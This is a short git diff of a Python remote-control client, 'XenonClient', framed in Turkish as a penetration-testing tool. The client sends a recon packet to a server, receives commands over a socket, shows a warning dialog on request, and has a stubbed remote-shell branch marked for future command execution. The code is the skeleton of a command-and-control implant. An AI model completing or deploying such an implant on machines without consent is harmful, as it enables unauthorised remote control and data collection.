@@ -30,20 +30,19 @@ class XenonClient:
                 self.sock.send(json.dumps(recon_packet).encode("utf-8"))
                 
                 while True:
-                    command = self.sock.recv(1024).decode("utf-8")
-                    if not command: break
+                    data = self.sock.recv(1024).decode("utf-8")
+                    if not data: break
                     
-                    # KOMUT İŞLEME MERKEZİ
-                    if command == "message":
-                        # Basit bir test mesajı kutusu
+                    if data == "message":
                         root = tk.Tk()
                         root.withdraw()
-                        messagebox.showwarning("Sistem Uyarısı", "Bu bilgisayar Xenon Sızma Testi altındadır.")
+                        root.attributes("-topmost", True)
+                        messagebox.showwarning("Xenon System", "Bu cihaz bir güvenlik denetimi altındadır.")
                         root.destroy()
                     
-                    elif command == "shell":
-                        # Buraya ileride CMD entegrasyonu gelecek
-                        print("[*] Shell komutu alındı.")
+                    elif data == "shell":
+                        print("[*] Remote Shell talebi alındı.")
+                        # Buraya ileride CMD çıktısı gönderen kod gelecek
 
             except:
                 time.sleep(5)
